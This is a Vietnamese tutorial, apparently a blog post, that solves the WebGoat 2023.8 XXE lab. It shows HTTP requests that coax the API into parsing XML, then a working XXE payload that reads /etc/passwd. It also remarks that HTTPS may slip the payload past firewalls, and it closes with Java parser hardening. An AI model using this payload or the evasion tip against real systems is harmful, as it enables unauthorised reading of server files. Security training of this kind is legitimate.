---
title: 1.08 | XXE
slug: XXE-08
description: Bài viết này sẽ hướng dẫn cách tấn công XXE trên WebGoat 2023.8
image: https://tiennhm.github.io/img/docs/database.jpg
sidebar_position: 1
# sidebar_class_name: hidden
tags: 
    - web-security
    - webgoat
    - security-misconfiguration
    - xxe
    - webgoat-2023.8
keywords: [web-security, webgoat, security-misconfiguration, xxe, webgoat-2023.8]
enableComments: true # for Gisqus comments, set to true
draft: false # set to true to hide this post from the site
---

> **XXE Injection – Assignment Solution**  

## **1. Mục tiêu bài tập**  
Bài tập này kiểm tra xem API có bị **tấn công XXE (XML External Entity)** hay không.  

- Ứng dụng có vẻ chỉ chấp nhận JSON, nhưng nếu ta thử gửi **XML**, API có thể vẫn xử lý được.  
- Nếu ứng dụng sử dụng trình phân tích XML mà không bảo vệ đúng cách, có thể khai thác để đọc file từ hệ thống backend.  


## **2. Phân tích request ban đầu**  

Khi nhập một comment vào ứng dụng, nó gửi request sau:  

```http
POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
Content-Type: application/json

{"text":"My first comment"}
```
Đây là một request hợp lệ và API xử lý bình thường.  


## **3. Thử đổi Content-Type sang XML nhưng vẫn gửi JSON**  

Bây giờ thử đổi `Content-Type` thành `application/xml` nhưng vẫn gửi JSON:  

```http
POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
Content-Type: application/xml

{"text":"My first comment"}
```
💥 **Lỗi nhận được:**  

```
javax.xml.bind.UnmarshalException\n - with linked exception:
[javax.xml.stream.XMLStreamException: ParseError at [row,col]:[1,1]
Message: Content is not allowed in prolog.
```
🔍 **Phân tích lỗi:**  
- API đang dùng trình phân tích XML, nhưng ta lại gửi JSON.  
- JSON bắt đầu bằng `{`, trong khi XML mong đợi ký tự `<`, dẫn đến lỗi parse.  


## **4. Gửi request XML hợp lệ**  

Thay vì JSON, ta gửi một request XML hợp lệ:  

```http
POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
Content-Type: application/xml

<text>This is my first message</text>
```
💥 **Lỗi nhận được:**  

```
javax.xml.bind.UnmarshalException\n - with linked exception:
[com.sun.istack.SAXParseException2; lineNumber: 1; columnNumber: 7;
unexpected element (uri:"", local:"text").
Expected elements are <{}comment>]
```
🔍 **Phân tích lỗi:**  
- API mong đợi **thẻ `<comment>`**, nhưng ta chỉ gửi `<text>`.  

✔ **Sửa lại request theo đúng format mong đợi:**  

```http
POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
Content-Type: application/xml

<comment><text>This is my first message</text></comment>
```
✅ **Kết quả:** API xử lý thành công và comment hiển thị trên WebGoat.  


## **5. Tấn công XXE Injection**  

Nếu trình phân tích XML không chặn **DOCTYPE**, ta có thể khai thác XXE để đọc file hệ thống.  

🚨 **Payload XXE Injection:**  

```http
POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
Content-Type: application/xml

<!DOCTYPE user [<!ENTITY root SYSTEM "file:///etc/passwd">]>
<comment><text>&root; This is my first message</text></comment>
```
💥 **Giải thích payload:**  
1. **DOCTYPE user**: Định nghĩa một thực thể (entity) tên `root`.  
2. **SYSTEM "file:///etc/passwd"**: Trỏ entity `root` đến file **`/etc/passwd`** trên máy chủ backend.  
3. **&root;**: Khi API xử lý XML, nó thay `&root;` bằng nội dung của file `/etc/passwd`.  


## **6. Kết quả mong đợi khi khai thác XXE**  
Nếu hệ thống dễ bị tấn công, phản hồi có thể chứa nội dung `/etc/passwd` như:  

```xml
<comment><text>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
</text></comment>
```
**📌 Nếu request bị chặn:**  
- Một số firewall của công ty có thể phát hiện payload này và chặn request.  
- Nhưng nếu dùng **HTTPS**, request sẽ được mã hóa và có thể vượt qua bảo vệ mạng.  


## **7. Phòng chống XXE Injection**  

### **1️⃣ Cấu hình trình phân tích XML an toàn**  
Trong Java (Spring Boot), tắt `DOCTYPE` và `ENTITY` khi parse XML:  

```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
DocumentBuilder builder = factory.newDocumentBuilder();
```

### **2️⃣ Chuyển sang JSON thay vì XML**  
Nếu ứng dụng không cần XML, nên **chỉ hỗ trợ JSON** để tránh rủi ro.  

### **3️⃣ Kiểm tra dữ liệu đầu vào**  
- Dùng **whitelist** để chỉ cho phép các thẻ XML hợp lệ.  
- Chặn mọi request có `<!DOCTYPE>`.  


## **8. Kết luận**  
- **XXE Injection** có thể khai thác lỗ hổng của API để đọc file hệ thống.  
- **Thử nghiệm trên WebGoat:**  
  - Đổi `Content-Type` sang XML để kiểm tra xem API có xử lý XML không.  
  - Gửi payload XXE để kiểm tra khả năng đọc file hệ thống.  
- **Phòng chống:**  
  - Tắt hỗ trợ `DOCTYPE` và `ENTITY`.  
  - Chỉ hỗ trợ JSON nếu có thể.  
  - Kiểm tra chặt chẽ dữ liệu đầu vào.  

